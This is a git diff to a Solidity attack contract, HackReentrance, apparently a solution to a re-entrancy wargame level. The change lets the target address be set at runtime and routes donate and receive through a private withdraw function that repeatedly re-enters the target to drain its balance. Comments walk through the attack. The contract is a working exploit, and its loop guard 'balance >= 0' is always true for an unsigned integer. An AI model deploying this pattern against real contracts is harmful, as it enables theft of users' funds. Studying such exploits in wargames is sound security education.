@@ -8,23 +8,31 @@ pragma solidity ^0.6.0;
 import "./Reentrance.sol";
 
 // "re-entrancy attack"
-// donate to itself
-// then call the fallback of the contract, that will try to withdraw the funds
-// then because of the code in the fallback, when receiving the funds, 
+// donate to itself some amount (call the donate function with for example a value of 1 ether)
+// then it will automatically call the withdraw function, and when it tries to send the funds
+// because of the condition we put in the fallback, when receiving the funds, 
 // it will re-enter the withdrawal function and keep withdrawing funds until there is no more
 
 contract HackReentrance {
-    Reentrance public reentranceContract =
-        Reentrance(0xb9d7F5A0D3E2435f4134e4567AbA316E853ce641);
+    Reentrance public reentrance;
+
+    function setAddress(address payable _reentrance) public {
+        reentrance = Reentrance(_reentrance);
+    }
 
     function donate() public payable {
-        reentranceContract.donate{value: msg.value}(address(this));
+        reentrance.donate{value:msg.value}(address(this));
+        withdraw();
+    }
+
+    function withdraw() private {
+        if (address(reentrance).balance >= 0) {
+            uint balance = reentrance.balanceOf(address(this));
+            reentrance.withdraw(balance);
+        }
     }
 
     receive() external payable {
-        if (address(reentranceContract).balance != 0) {
-            uint256 balance = reentranceContract.balanceOf(address(this));
-            reentranceContract.withdraw(balance);
-        }
+        withdraw();
     }
 }
